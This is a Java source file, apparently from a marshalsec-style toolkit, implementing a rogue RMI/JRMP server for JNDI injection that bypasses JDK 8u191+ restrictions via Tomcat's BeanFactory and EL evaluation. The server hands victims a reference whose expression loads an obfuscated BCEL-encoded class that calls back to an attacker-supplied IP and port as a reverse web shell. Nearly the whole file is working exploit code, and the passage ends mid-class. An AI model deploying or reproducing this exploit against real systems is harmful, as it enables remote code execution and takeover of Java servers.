package marshalsec.jndi;


import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.MarshalException;
import java.rmi.RemoteException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;
import java.util.Arrays;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import org.apache.naming.ResourceRef;
import sun.rmi.transport.TransportConstants;


/**
 * Generic JRMP listener
 *
 * bypass jdk8u191+
 *
 *         <dependency>
 *             <groupId>org.apache.tomcat</groupId>
 *             <artifactId>tomcat-catalina</artifactId>
 *         </dependency>
 *
 *         <dependency>
 *             <groupId>org.apache.tomcat</groupId>
 *             <artifactId>tomcat-jasper-el</artifactId>
 *         </dependency>
 *
 *         or
 *
 *         <dependency>
 *              <groupId>org.apache.tomcat.embed</groupId>
 *              <artifactId>tomcat-embed-core</artifactId>
 *         </dependency>
 *
 *         <dependency>
 *              <groupId>org.apache.tomcat.embed</groupId>
 *              <artifactId>tomcat-embed-el</artifactId>
 *         </dependency>
 *
 * @author threedr3am
 *
 */
@SuppressWarnings ( {
    "restriction"
} )
public class TomcatELRMIRefServerToLoadReverseWebShell implements Runnable {

    private int port;
    private ServerSocket ss;
    private Object waitLock = new Object();
    private boolean exit;
    private boolean hadConnection;
    private ReferenceWrapper referenceWrapper;


    public TomcatELRMIRefServerToLoadReverseWebShell( int port, ReferenceWrapper referenceWrapper ) throws IOException {
        this.port = port;
        this.referenceWrapper = referenceWrapper;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }


    public boolean waitFor ( int i ) {
        try {
            if ( this.hadConnection ) {
                return true;
            }
            System.err.println("Waiting for connection");
            synchronized ( this.waitLock ) {
                this.waitLock.wait(i);
            }
            return this.hadConnection;
        }
        catch ( InterruptedException e ) {
            return false;
        }
    }


    /**
     *
     */
    public void close () {
        this.exit = true;
        try {
            this.ss.close();
        }
        catch ( IOException e ) {}
        synchronized ( this.waitLock ) {
            this.waitLock.notify();
        }
    }


    public static final void main ( final String[] args ) {
        if ( args.length < 2 ) {
            System.err.println(TomcatELRMIRefServerToLoadReverseWebShell.class.getSimpleName() + " <port> <webshell-reverse-ip> <webshell-reverse-port>"); //$NON-NLS-1$
            System.exit(-1);
        }
        int port = Integer.parseInt(args[0]);
        String revIp = args[1];
        String revPort = args[2];
        System.out.println(String.format("[%d, %s, %s]", port, revIp, revPort));
        try {
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",true,"org.apache.naming.factory.BeanFactory",null);
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            resourceRef.add(new StringRefAddr("forceString", "x=eval"));
            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
//            String elp = "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dVYt$hg$V$feF$96$f5$cb$e3$89$9dH$f1$o$93$a6I0$8d$d7$88$b6$G$8aS$K$b1q$c0$adl$a7$b1$T$db$J$dbX$k$cb$93$c8$p1$g5$LKK$uPhKY$daB$e9$5e$W$T$C$85$94FNb$b7$ec$Oi$d8$P$P$3c$f0$c29$3c$f1$c0$h$P$9cSj$be$7fF$b2$a5x$dc$a3$a3$fb$cf$dc$7b$ff$fb$dd$ffn$f3$bf$f6$c6$e5W$B$f4$e0$_$wnF$aa$G$bb0$x$89$vpLE$Q$c7$rIK$ce$9c$q$96$40F$m$abB$c5$c7U$d4$c0$W$c8$J8$w$ea$90W$b1$J$f7HrBJNJrJ$92$d3$C$9f$Q$f8$a4$8aO$e1$d3$w$gq$af$q$f7$85$f1$Z$b9$9e$R$f8$ac$8amHIr$bf$8a$cf$e1$f3$92$7cAE$D$k$Q$f8$a2$8a$_$e1$8cJ$e4$H$e5$d3C$C$P$ab$f82$k$J$e3$x$w$be$8a$af$a9$f8$3a$k$95$e41$V$8f$e3$h5$f8$s$9e$I$e3$5b$d2$d8$93$w$9e$c2$d3$C$cf$I$3c$ab$m$60f$VD$S$c7$f4$7b$f4xZ$b7R$f1Q$c76$ad$d4$5e$F$c1l$c6v$U$d4$9aV6$ef$90k$e8s$K$g$3cM3$T$l$5ccSY$cb$e4$9d2$b5$c6U$b5$912$3e$f5B$b7$9b$96$e9$dc$a1$60w$dbz$cc$f5$9c$f6$c3$f4$a3$3f3m$u$a8O$98$961$9c$9f$9b2$ec1$7d$wmH$af3I$3d$7dX$b7M$f9$5ed$G$9dY3$t$b5$c7fm$c3$98$b6o$d5$e7$s$s$s$88$bc$a7$cd$d7u$7fG$rn$95$9d$b7H$db$e4s$ddT$7ef$c6$b0$8d$e9q$dbt$M$5bA$f3$ea$be$be$K$89$8c$h$zL$fbi$i$q$df$d5$a8N$f3$u$b7$uP$8c$d5$80$ba$87$k8$994$b2$8e$99$b1$a8$b3$v$e7F$a0$_o$a6$a7$r$60l$5dp$8a$o$89$u$ed$d1$d5$ac$9dQ$Q$zS$3c$60g$92F$$$t$e3$9e$cb$q$8f$hL$e7$WOl$ZN$7c$d4e$ed$z$3b$9d$e7$n$c1G$j$3dy$7cH$cf$baAuK$3b$e7$V$x$abR$e09$d6$9f$c0$f3$ac9b$cf$e9$s$c3$d4$d8vt$83$ec$e9v$8a$f9$88$fa$88$Z$88$a9S$8eAi$e0h$l5$93n$9e$d5$d5$uP$a0$8ef$f2v$d2$d8o$ba$f9$aeH$e9$kiOC$_$fa5$dc$8a$k$N$ef$40$8f$82$cdk$uR$5b$9f$96$g$_h$f8$b6T$7b$t$de$a5$e16$bc$9b$ee$fagOA$8b_9xBi$e9$3b$92$7c$d7g$7f$vr1$9f$g$f3dr$e7$f7$q$99$d7$f0$7d$9c$d5$f0$D$9c$d3$f0C$e9$d7$8f$d0$cf$I$f9$d4$B$eb$f8$bal$J$bc$a8$e1$c7$f8$894t$5e$c3K$f8$a9$82p$$$9f$94i$de$a9$e1e$5cP$d0$b4A$a5h$u$60A$e0$a2$86K$b8$aca$RK$g$5e$c1Y$a6$bb$o$b0$cc$ac$b4$beO$c3$ab$d2Zt$f5D$p$ab$7e$J$fcL$c3$cf$f1$LJ$xs$92L$eb9V$ca$_5$fc$K$bf$W$f8$8d$86e$5c$d1$b0$l$bf$V$b8$aa$e15$5c$T$f8$9d$86$df$e3$Pt$bb$b5$b5$af$7f$m$d1$da$aa$e1$8f8$x$f0$t$N$7f$c6$b9$8a$U$8eL$j3$92$y$da$c8$g$eb$60$de$b2$bcN$df$7c$fd1Y$dc$ebJ$9f$d1$u$l4$a5$ddniV$e7$i$5dN$b8X$db$c6C$m$ba$s$x6$b8$e46$fb$cf$92$eb6$U$fb$5dr$c3$b2$U$Tn$97nmk$f7m$85$T$d2$3c$e7$81$cf$5c$94$W$84e$9c$f0$MT$cf$a4$f3$b9$d9$8a$c3$OZ$8e$91$92$e5$X$ce$eav$ce$e0$eb$G$86$Ge$a7$ae$e7$PJ$84$fa$94$e1$8cTL$f1$e6$92$ab$eb$e7x$j$95$H$cb$3f$MMe$ba$95$9f$86$90$9e$cd$g$W$tb$b7$9fGo2$d6$b6T$e4$cd1$e7$e4t$m$ee$eaKCE$u$8bl9$P$8d$93F$d2$ff$T$d3$ee$3b$j$a5$d5$n$3e$ea$v$c3$3b$da$80mg$ec$d2$d1$ea$d7$b6$f4$cb$fa$f6T$dc$c7D$a6$d8$f6$V$9e$94$89h$bc$c1W$c0J$91G1r$ee$80$db$97$x$81$b5o$ec$f4$ba$c8F$7d$d8$Kj$c84$d3$5e$8f$f0$eb$c5$94W$b7$j$ed$93$eb$z$c9$cc$5c$3c$97$b7$e2$Z$3b$V$d7$b3zr$d6$88O$r$8dt$dcd$fd$d8$96$9e$8e$bb$fd$3b$c3i$h$3f$e4$98i$d39$c5$f4$Z$967$98$9bh$e5$88o$ed$96w$e2$a9$9cc$d0$89$w$de$H$cao$L$H$a8$ba$e6x$d8$c9$94Z6$ea$a3$c1j$cf$ca$b7$b4$85$9d$bc$e1$dc$M$ba$ce$dbV$40$cey$de$c9$Cr$d4$bb$x$H$ba$bbr$a6s$NR$af$X$7bIo$e7$db$y$aa$f8$DZ$3a$W$a0tt$5e$40$a0$a3$eb$C$aa$W$R$9c$q$a7$ba$80$d0yw$ef$7bH$hQ$ed$d2$m$9ax$_k$e6$a5$z$c6_$L$ee$mw$87g$F$ef$c5$fb$A$f7Iz$a1$b8O$d2$8f$80$8b$bao$pT$nQ$c3o$82$ba$8d$a87$Qu$3bQo$q$ea$8e$NP$e5Y$3dTyZ$89$da$87$7e$P5$f00$z$85$B$a5$b6$e3e$84$97q$80$8bX$c6$e0$oj$s$X$a1NJ$ee$Cj$X$a0$r$W$b1$89$ac$3a$c9$S$L$a8_$c0$e6$a1$ae$C$b6L$O$_$p$da$d9$5d$40$a4$b3$c0$87$C$b6$ce$af$fck$k$af$q$e6qi$R$8dR$3d$c0$7f$d5E4$z$f0fS2L$c5$98gx$a8$x$d2$c2$dd$b4$V$e5$7fk$J$86$Ko$f1$60$86$X$b1mr$B7$f4$G$bb$r$5eo$f5$V$d4$c5$821Fd$fb$f8$fc$ca$bf$95$de$d0E$dc$u_w$f4$86$e6$d1$d8$x$bab$a2$80$9de6c$a1$x$I$cd$af$5c$5e$c4$ae$c9X$a8$80$b7z$e8$ad$e3$r$c6$dbJ$8c$f9$95$c7$S$e7$Z$c0$3a$M$e1$A$ef$cbK$fc$K$5d$e5$3a$a6$d4$u5$b8$89$S$Z$fe3$M2$d0J$ad$9bXf$bb$99$cav$f2$3b$Y$d6N$7e$b0$ba$b8w$P$c6$e4$dd$9f$c5$97e$d2OS$e3$3e$a6$fc$7e$a6$e2$B$s$e1Iy$l$60$f8_$e4$aeKL$d4$S$8b$60$99$3b$af$d2$c25$a6$e6$afx$3f$fe$86$B$fc$j$l$c0$3f$f0A$fc$Tw$e1$3fH$u$n$M$d1$8b$RE$c5$ddn$aa$b3$a8$r$7e$X$b5$H$98$ce$k$96$c0$7e$ee$I$d0z$94$bbz$e8$ed5l$c1$m$ee$84$m$de$U$ad$qX2$e7p$94$k$f60$f1K$94$Mc$E$nz$fa$C$cf$7b7$ad$9c$c6$p$ae$bd$A$bd$b4p$90$f6$aady$U$cbi$94$ff$p$d0$fe$87$k$811$81C$ffEs$9f$c0$e1$aa7$b0_$60$dc$e3$bd$8e$b0$c0$c4$eb$d8$w0$b9$82z$I$81$p$abBJ$c8$WtA$e1$be$88Xa$Y$f9tD$92$P$81$c5$fca$7c$84$d8$b2$n$k$rr$90$ebm$91$5d$F$ec$8e$b4$V$d0$9e$60$9e$3a$96$c2C$9d$ccj$e7xW$f0$o$ba$86_Bw$b1$40$o$7bX$S$ac$91$ed$F$c4$Lx$fbZ$bb$b4$f0$84$60Fjq$I$R$if$9b$8e$b3i$s$d8$W$93n$i$3b$3c$i$7c$U$l$e3Z$8b$eeb$cbD$98_$9dq$LP$bb$FI7$a2$d3$c5q$d1$c0$bf$e1$o$cc$fc$l$c7$aeo$93$f1$N$A$A').getConstructor(java.lang.String.class, java.lang.String.class).newInstance('" + revIp + "', '" + revPort + "')";
            String elp = "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85W$L$7c$5be$V$ff$9f$q$cdMno$df$5d$dbt$c06$e8X$faZ$a4$M$90t$mkYG$b7v$z$eb$a0t$h$8f4$bbk$b3$a5IHn$d8Z$40$f1$8dCE$7c$e1$EQD$v$K$82CH$L$FT$84$a1$e0$TE$7c$a0$m$3ey$fa$W$91$3d$3c$e7$de$a4M$da$3b$f8$b59$df$bd$e7$3b$dfy$3f$be$fb$f8$e1$fb$l$C$b0$8a$C$wzq$8d$X$ab$f1a$B$lQ$f0Q$V$$$5c$x$e0c$82$b9N$c0$c7$V$7cB$c1$tU$a8$f8$94$K$_$3e$ad$e0z$F$9fQQ$8a$7d$wJ$f0Y$B7$c8$ce$8d$C$3e$t$e0$s$F$9fW$f0$F$V7$e3$8b$wjp$8b$80$_y$f0eYo$f5$60R$85$l$b7y$f0$VY$bf$w$e0v$P$ee$90$f5k$w$ee$c4$5d$C$be$ee$c1$7e$c1$dc$ed$c17$U$dc$a3$e2$5edTLaZ$b8$de$a7$e2$7e$cc$I$b8I$c0$D$c2$f7$B$P$kT$f0$90$d0$7cS$c1$b7d$fdv1$k$c6wT$3c$82G$F$i$Q$f0$98$8a$ef$ca$81$3b$f1$3d$V$8b$f0$b8$82$tT$7c$l$b7$aal$eb$P$e4$e9$87$K$7e$e4$c1$8fU$fc$EO$K$edO$F$fcL$c5S$f8$b9$XO$e3$X$K$7e$a9b$j$ae$f1$e0W$b2$feZ$c03$w$7e$83$df$wxV$c1s$EG$qA$a8$ec$d9$Z$ba$y$U$88$86b$p$81$B$p$Z$89$8d$b4$T$5c$89x$d2$mT$e5$edu$c7$M$7dDO$f2fq$q$96H$hL$ab$87$c6$I$8b$y$9aH$9c$vf$d1L$a5$c5$d3F$kY$cd$yY_$k$9e$e9$dc$ab$p$b1$88q$s$c1$ef_$a8$89$8d$fc$c6$f3Y$bd$ce$f8v$9dP$d6$T$89$e9$h$d3c$c3zrsh8$aa$8b1$f1p$uz$7e$u$Z$91$f7$y$d2e$8cFR$84$d2$9eM$faez2$a5$P$8c$ea$d1$uK$5e$e9$b7U$dd$5eQ$R$ebL$a6c$M$fd$f2$5c$3a$9c$de$b1CO$ea$db$H$93$RCO$S$eaf$cfu$U$ec$887$99$c3v$3b$8aM$8c7$v$8a$a2lI$h$f3$O$8f1a$d5V$db$98$ec$88$885E$c3$e3$86$ce$e68$b6v$b0$bdF2$UK1$af$$$de$h$88$87w$e9$i$b5$K$ebtL7$C$W$8a$P$7b$8d$f8$80nt$99$iJg$f5$90w3$da$nc$94P$9d$3d$c7$h$o$w$d0$cfX$de$r$7d6$c8$a6Bk$f7$84$f5$84$R$89$c7$e4$a4$e8$cdj$t$92$f1$c2l$e9O$c6$c3z$w$r$f1Me$d5$9a$f5$98e5$a1d$c0$I$85w$f5$86$Sf$9c$cc$f2$bd$de$wH$ae$p$F$bf$e3$8cW0$a2$e0y$F$bf$e7$5cgic$a1$I$H$a0$c6o$e3$l3$zB$c9$R$f6$8c$xlf$87$3a$ab$u$e3$d4$81x$3a$Z$d6$z$HT$e4$t$c2Ja$a5a$Q$97h$e8C$bf$86s$b1$89P$3e$t$60$f3$a8$84O$u$fe$a0$e1$8fB6$80$cd$g$ce$DK$ac$b1$8f9$a1$de$$$89$acM$e1$f4$t$B$7f$b69$9f$f3$8d$cf$s3$ad$3d9$f9$X$B$_hx$R$_ix$Z$afhxU$f4$fa$x$$$e1$u$d8D$8aKe$5eJ$u$f8$9b$86$bf$e3$l$c2$e8$9f$g$fe$85$7f$T$3c$a9tX$82$b6L$c3$7f$f0$g$fbQ$df$T14$fc$X$afs$U$h$$$ef$ee$g$b8R$c3$ff$f0$86$86$838$c4$v$b5$ada$9b$m$b71$f60$8e$u$5c$f2D$e4$d0$c8I$$f$b6$3d$be$3b$W$8d$b3$e3$a8$I$_q$W$z$zp$aa$V5$85$dc$g$v$e4Q$c8$ab$91J$c5$giT$a2P$v$hEe$g$95$8b$3d$eetB$d8p$f9$Ufgg$3c1$degZ$a7Q$FU$$$d8$e7$de$b0$x$b7_E$d5$9cC$g$z$a2$g$85j5$aa$p$9fF$f5$C$W$93$8f$TLt$3eF$a3cEQ$z$3f98$L$c5C$Xit$9cx$a4j6$w$7dy$be$ad$yH$a7p4$94J$v$b4Dc$8b$97it$bc$f88L$t$u$d4$a0$d1r$3aQ$a1$V$g$f9$a9$91P$3b$df$h$j$e9H$d4$M$be$a7$a1$a1$a3smO$D$9fh$a2f$8dZ$f0$92B$ad$g$ad$c4$x$FN$ec$h$de$a9$87$b9$b2$w$e7P$9b$d2$b1$98$d5$f5$w$W$Uc$be$fe$f9$j$bcra$d9$b3v$f9$dd8$c7$d5$ac$b2$a2$94$R$92$e1$e0$f3$l$bdSV$cd$ede$bb$a0$60$eb$ec$h$ee$bc$D$d9$a6$uX$8fT$5e$8f$d9b$aa$fd$8dvM$b1h$b7$b0$e7$Ge3$3c$84$83$S$d3w$5b$M$8avD$d3$a9$d1$C$bfdG$K$cb$89$c4$8c$f3C$d1$b4nv$f7ni1$L$d9u$L$bf$b2$R$dd$e8$x$Ylu9$c5$W$8e$b6R$s$$$f0tm$km$e1$b4t$eb$97$a6C$d1$d4$3cC$ac$A$b77n$e1$Gfz$3d5$Y$91$e0$d8Z$cbD$deTz8e$be$KM$b7$bd$c7R$89h$84$c3$b7$c2$8e$87$ed$e0$a9$uH$E$p2$s$cd$95M$9b$7dYT$Q$9b$y$ba$ddl$mzX$G$bb$5d$bf$b6$j$W$$$de$i$cb$e5iAF$b2k$9c$p2F$dam$f4$3e$3a$ff$f9$c3l$kg$99$H$ccY$93$3c$5b$T$8dvX$a35$97$a7$85$87$he$e0z$S$n$aetN$9c$a3$E$81s$a7$da$$$h$d8$ef$fe$ad$jf$f9$84$a3$f1$94nN$a9$c48a$dd$9b$5dB$K$V$d8$3a$P9$d7$B$db$h$d7K$K$ed$89$a4$MV$bf$cdV$fd$f9$a7$e7$fa$a3$99$3an$pn$N$c7$f2$bc$i$cd$de$P$b4$fcw$9e$db$v$ddX$cb$91M$h$d9$fb$95$7f$8bp$uf$b4$d4$ae$85$947$v$7d$eb$cd6$d9l3$40$S$ab$97$lC$p$baU$40k$93$c9x2$e7$c4$b2$b9$p$9d$d2g9$a0$92$88z$ca$9c$eekR9$ba$c6$a3$cb$5bPz$5e$c6F$a2$96$9ef$908$86m$e1$f8X$m$95$8e$F$e2$c9$91$40$u$R$K$8f$ea$81$e1$b0$k$Np$a3$d0$93$b1P4$60$b6y$d3$91$e7$Z$R$$$a8q$J$40$cc$bay$d42$97$z$b6$c5$97$3f$B$c7S$86$ce$aa$3a$f9$9e$9c$7f$8b$eeg$d2$bc$be$QJ$q$f4$YO$bf$d6$b7$f0$60$c1$I$e1$83$k$be$f0e$3bA$95$Nk$ee$8c$Jy$8b$c6$b0$8c$3f$uzA$d8$c8$9fS$O$b9$C$f1G$97CnA$e6$caw$js$e5$eb$O$af$$$a6$h$c4$F$M$87$f8m$UN$fe$D$ea$9b$a6$40M$cd$f7$c2$d1$d4r$_$9c3p$N1$a6$u$D$f7$7e$f3$ec$W$865$ubX$cb$i$ea$f8$c3$cb$c7_e$f5$M$Xc$xc$97Z$5c$b0$N$X$C$e6$93hA$e6$93$e8$e10$a5$5et4$a9$8aH$f5$bc$89$d4cY$eaq$yu$JK$5d$caR$97$jE$aa$d8jI$VkE$ea$c5$b8$c4$92$ea$3a$c8$9cJ$99$ed$ca$a6$7b$e09$80$7e$5e$94$D$e8$9e$81wh$G$ea$90$60$a7P$3c$F$adg$G$r$8c$w$V$942$85$b2$v$94$f7$b6dP1$b4$f1$A$aa$9a$5b3$a8l$ce$f0C$G$d5$93G$5e$9c$a4$e7z$s$e9$99$Z$d4$I$b9$83$7f$ce$Mj$a7$f8S$n$c7$98$J$7d$W$e3$de$96$caz$3e$cd$bc$aa$f8W$9d$T$c3$E$8b$z1$h$99yE$d0$e5sU$k$93$c1$b1$fb$e0$daO$c1$o$7e$3b$$$83$r$fbp$bc$cfU$ee$ce$60$a9I$b0$y$83$e3$83$eei$9c$e0cTC$b0h$92$aa$Z$bb$dc$q$dc$c9$84$k$s$cc$e0D$93v$85I$ebs$3b$db$82$8a$cf$edj$Lz$7c$ee$a2$b6$a0$d7$a78$l$84$7f$g$8d$d3h$K$aab$82$cf$e3$f3N$a3$99$d5$P$W$fb$8aYq$9f$9aA$8b$f9$94Akv$5d$vk$60$S$b70$eb$b7$99$C$af$cdj$f6V$C$e7$89P$85$fbb$96$94$d3$p$a8$f9$8a$7d$g$bf$9c4$8d$b6$L$cc$a7$93$a7$b1j$l$96$f9$b4$fbp$K$nX$e2$xqep$ea$a0$b9$9cf$zo$l$U$85N$Xf$acU$89$f8$84$b1A$f6$Jj$82$ee$WqP$7b$9e$db$7dE$8f$c1$3dy$f8$fa$Z$ac$k$f2q$b2$9da$F$e8$cc$c1$i$e2$j9$c4$e4$e1d$cf$7e$ce$bcR$ae$ae$7e$fe$82$bf$8b$5e$a0$97y$dd$8c$db$j$z8$Lw8Z$cc$d5$v$99J$w$3a8$f3$963$f5$K$ceO$3fV$a1$Jg$a0$99$b1$z$e8B$x$f3$I$f0$c96$8c$e0d$qxw$C$a7$e0$w$9c$8a$f7$e14$5c$8d$d3q$D$daq3W$f2$ed$7c$ea$O$9c$89$bb$98$f3$7dX$83$87$99$c3$T$e8$c4S8$h$cfc$z$7f$ut$e15$ac$c3$n$9cCNt$93$X$eb$a9$W$hh$Fz$e8$q$f4$d2$e9$d8Hk$d0G$5d$e8$a7$B$9cK$X$f3$d7$d0$u$G$u$86$cdd$e0$3c$9a$e0$cf$9e$bd$Y$a4$ebp$B$dd$88$n$ba$N$5b$e8$kl$a5$H$b1$8d$k$c1$85$f4$E$$$a2$t$f9$de$fe4B$f4$M$86$e9Y$be$fc$be$80$I$5b$ae$d3$ab$d8A$afa$84$de$c0$u$j$c1N$87$L$bb$i$Kb$8e$3a$c4$j$8dH$b07$92$8eV$Yfu$k4$eb$b4$F$n$Ms$F$ae$e2$b70$b6sM$GQ$F$9d$fd$e9d$abT$ec$60$7f$b8$d9$9e$be$ec$d3$nts$7f$e8$87$c2$b6u$9a$5d$c4$c3$W$9e$c1$5d$a4$l$5e$b63$80$IvBek$97$60$X$a2$uf$bd$Xa$M1$94$b0$95$86$c5$85m$8de$b9$Y$bcZ$5c$sX$P$8b$cb$5e$eeHrVe$ll0$7bF1$7b$e2$y$c49$$$g$dbX$81K$91d$5dn$a6$ab$91$e2$T$$$8e$fc$E$f3Ns$H$Z$a1Gq$Z$9f$rL$d0$dd$a6m$O$dc$c0$7cv$b3mN$e9$$$d9n$b4$87$7f$7bQ$7e$I$ab$U$8c$x$98x$ju$j$K$$w$kF$97$82$x$y$dcA$94$x$b8$f2$m$9a$V$bc$f3$N$q$8ep$g$94$ux$d7$ec$3eo$f2$8e$82$ab$cc$H$eb$9f$b7$de$ad$e0$3d$c0$Rhp$_$a4$G$bc$o$a7R9$82$G$Q$ef$Lx$_c9$cf$de$cf$baJ$ff$bd$8e5u$f1zJ$e5$ea$ca5$Zt$f4p$c2w$3e$e0$e9m$e6$f28$7b$b0$c55$8d$b5$h$efF$d7$M$d6$NM$e1$9c$ca$ee$M$d6scZ$9f$c1$86$Mz$e6Zs$3d$bb$Il$b8$87$8d$z$c38$87a$82$c7$c1$e5$i$ea$x$cc$Eh$b2$84$e0$D$i$S0Uk$b6$3d$97$e1D3$88$O$a6$ae$c7$H$cdT$b8$3a$3b$9a$W$f1$efC$a6$84$bd$ff$H$eb$C8$z$3e$U$A$A').getConstructor(java.lang.String.class, java.lang.Integer.class).newInstance('" + revIp + "', " + revPort + ")";

            String el = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + elp + "\")";
            resourceRef.add(new StringRefAddr("x", el));
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);

            System.err.println("* Opening JRMP listener on " + port);
            TomcatELRMIRefServerToLoadReverseWebShell c = new TomcatELRMIRefServerToLoadReverseWebShell(port, referenceWrapper);
            c.run();
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (NamingException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void run () {
        try {
            @SuppressWarnings ( "resource" )
            Socket s = null;
            try {
                while ( !this.exit && ( s = this.ss.accept() ) != null ) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        try ( DataInputStream in = new DataInputStream(bufIn) ) {
                            int magic = in.readInt();

                            short version = in.readShort();
                            if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
                                s.close();
                                continue;
                            }

                            OutputStream sockOut = s.getOutputStream();
                            BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                            try ( DataOutputStream out = new DataOutputStream(bufOut) ) {

                                byte protocol = in.readByte();
                                switch ( protocol ) {
                                case TransportConstants.StreamProtocol:
                                    out.writeByte(TransportConstants.ProtocolAck);
                                    if ( remote.getHostName() != null ) {
                                        out.writeUTF(remote.getHostName());
                                    }
                                    else {
                                        out.writeUTF(remote.getAddress().toString());
                                    }
                                    out.writeInt(remote.getPort());
                                    out.flush();
                                    in.readUTF();
                                    in.readInt();
                                case TransportConstants.SingleOpProtocol:
                                    doMessage(s, in, out);
                                    break;
                                default:
                                case TransportConstants.MultiplexProtocol:
                                    System.err.println("Unsupported protocol");
                                    s.close();
                                    continue;
                                }

                                bufOut.flush();
                                out.flush();
                            }
                        }
                    }
                    catch ( InterruptedException e ) {
                        return;
                    }
                    catch ( Exception e ) {
                        e.printStackTrace(System.err);
                    }
                    finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            }
            finally {
                if ( s != null ) {
                    s.close();
                }
                if ( this.ss != null ) {
                    this.ss.close();
                }
            }

        }
        catch ( SocketException e ) {
            return;
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }


    private void doMessage ( Socket s, DataInputStream in, DataOutputStream out ) throws Exception {
        System.err.println("Reading message...");

        int op = in.read();

        switch ( op ) {
        case TransportConstants.Call:
            // service incoming RMI call
            doCall(in, out);
            break;

        case TransportConstants.Ping:
            // send ack for ping
            out.writeByte(TransportConstants.PingAck);
            break;

        case TransportConstants.DGCAck:
            UID.read(in);
            break;

        default:
            throw new IOException("unknown transport op " + op);
        }

        s.close();
    }


    private void doCall ( DataInputStream in, DataOutputStream out ) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass ( ObjectStreamClass desc ) throws IOException, ClassNotFoundException {
                if ( "[Ljava.rmi.server.ObjID;".equals(desc.getName()) ) {
                    return ObjID[].class;
                }
                else if ( "java.rmi.server.ObjID".equals(desc.getName()) ) {
                    return ObjID.class;
                }
                else if ( "java.rmi.server.UID".equals(desc.getName()) ) {
                    return UID.class;
                }
                else if ( "java.lang.String".equals(desc.getName()) ) {
                    return String.class;
                }
                throw new IOException("Not allowed to read object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        }
        catch ( IOException e ) {
            throw new MarshalException("unable to read objID", e);
        }

        if ( read.hashCode() == 2 ) {
            // DGC
            handleDGC(ois);
        }
        else if ( read.hashCode() == 0 ) {
            if ( handleRMI(ois, out) ) {
                this.hadConnection = true;
                synchronized ( this.waitLock ) {
                    this.waitLock.notifyAll();
                }
                return;
            }
        }

    }


    /**
     * @param ois
     * @param out
     * @throws IOException
     * @throws ClassNotFoundException
     * @throws NamingException
     */
    private boolean handleRMI ( ObjectInputStream ois, DataOutputStream out ) throws Exception {
        int method = ois.readInt(); // method
        ois.readLong(); // hash

        if ( method != 2 ) { // lookup
            return false;
        }

        String object = (String) ois.readObject();
        System.err.println("Is RMI.lookup call for " + object + " " + method);

        out.writeByte(TransportConstants.Return);// transport op
        try ( ObjectOutputStream oos = new MarshalOutputStream(out, this.referenceWrapper) ) {

            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);

            oos.writeObject(referenceWrapper);

            oos.flush();
            out.flush();
        }
        return true;
    }


    /**
     * @param ois
     * @throws IOException
     * @throws ClassNotFoundException
     */
    private static void handleDGC ( ObjectInputStream ois ) throws IOException, ClassNotFoundException {
        ois.readInt(); // method
        ois.readLong(); // hash
        System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
    }


    @SuppressWarnings ( "deprecation" )
    protected static Object makeDummyObject ( String className ) {
        try {
            ClassLoader isolation = new ClassLoader() {};
            ClassPool cp = new ClassPool();
            cp.insertClassPath(new ClassClassPath(Dummy.class));
            CtClass clazz = cp.get(Dummy.class.getName());
            clazz.setName(className);
            return clazz.toClass(isolation).newInstance();
        }
        catch ( Exception e ) {
            e.printStackTrace();
            return new byte[0];
        }
    }

    public static class Dummy implements Serializable {

        private static final long serialVersionUID = 1L;

    }

    static final class MarshalOutputStream extends ObjectOutputStream {

        private ReferenceWrapper referenceWrapper;


        public MarshalOutputStream ( OutputStream out, ReferenceWrapper referenceWrapper ) throws IOException {
            super(out);
            this.referenceWrapper = referenceWrapper;
        }


        MarshalOutputStream ( OutputStream out ) throws IOException {
            super(out);
        }


        @Override
        protected void annotateClass ( Class<?> cl ) throws IOException {
            if ( this.referenceWrapper != null ) {
                writeObject(referenceWrapper.toString());
            }
            else if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                writeObject(null);
            }
            else {
                URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                String cb = "";

                for ( URL u : us ) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }


        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass ( Class<?> cl ) throws IOException {
            annotateClass(cl);
        }
